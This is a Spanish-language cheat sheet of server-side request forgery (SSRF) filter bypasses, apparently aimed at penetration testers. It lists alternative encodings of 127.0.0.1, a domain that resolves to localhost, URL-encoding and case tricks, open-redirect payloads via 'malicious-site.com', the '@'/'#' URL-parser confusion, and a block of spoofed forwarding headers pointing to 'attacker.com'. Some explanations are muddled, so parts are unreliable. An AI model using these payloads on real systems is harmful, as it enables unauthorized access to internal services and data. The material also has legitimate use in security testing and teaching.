---

### 🚀 **Server-Side Request Forgery (SSRF) Cheat Sheet**

---
---
### **1. Usar Representación Alternativa de IP**
Representaciones de la IP `127.0.0.1`:
- **Decimal:** `2130706433`
- **Octal:** `017700000001`
- **Forma abreviada:** `127.1`

---

### **2. Registrar un Dominio Controlado**
Registra un dominio propio que resuelva a `127.0.0.1` para realizar pruebas o explotar la vulnerabilidad:  
- Ejemplo: `spoofed.burpcollaborator.net`

---

### **3. Ofuscar Cadenas Bloqueadas**
- **URL Encoding:** Convertir caracteres especiales. Ejemplo:  
  ```
  /admin → %2Fadmin
  ```
- **Case Variation:** Cambiar entre mayúsculas y minúsculas:  
  ```
  /Admin → /admin
  ```
---

### **4. Usar Redirecciones**
Configura una redirección en un dominio controlado para apuntar a la URL objetivo.  
- **Entrada del usuario:**  
  ```
  http://malicious-site.com/redirect?url=http://target-site.com/admin
  ```
- **Cambio de Protocolo:**  
```
  http://malicious-site.com/redirect?url=https://target-site.com/admin
```

### **5. Modificar el Referer**
- Cambiarlo para engañar validaciones, acceder a recursos internos o inyectar datos en logs/paneles si se usa sin filtrar.

### **6. Bypass mediante el uso de autentitcacion y `#`**
```
api=https://localhost:80#@domain.com
```
- Esto funciona porque en una URL la parte antes de @ se interpreta como credenciales de autenticación (usuario:contraseña@host).
- El # marca el inicio de un fragmento en la URL.
	- Todo lo que está después del # normalmente no se envía en la petición HTTP (es solo para el navegador).
	- El parser de URLs en algunos filtros interpreta https://localhost:80#@domain.com como si el host fuera localhost, pero el filtro puede equivocarse y ver domain.com.
- Esto puede permitir:
	- Bypass SSRF filters que bloquean localhost o direcciones internas pero no procesan correctamente el fragmento/usuario.
	- Engañar la validación del dominio, ya que @ en realidad cambia el host real a lo que está después.
---
## **Cabeceras HTTP para Evasión de SSRF**
Algunas cabeceras útiles para intentar redirigir o manipular la solicitud:

```http
Host: vulnerable-website.com
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: attacker.com
X-Forwarded-Server: attacker.com
X-Forwarded-Port: 80
Forwarded: for=127.0.0.1;host=attacker.com;proto=http
Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
Referer: http://attacker.com
Origin: http://attacker.com
X-Forwarded-By: 127.0.0.1
X-Forwarded-Proto: https
Via: 1.1 attacker.com
X-Api-Version: 1.0
Max-Forwards: 10
X-Wap-Profile: http://attacker.com
Proxy-Authorization: Basic Zm9vOmJhcg==
Surrogate-Capability: attacker="Surrogate/1.0"
```

---

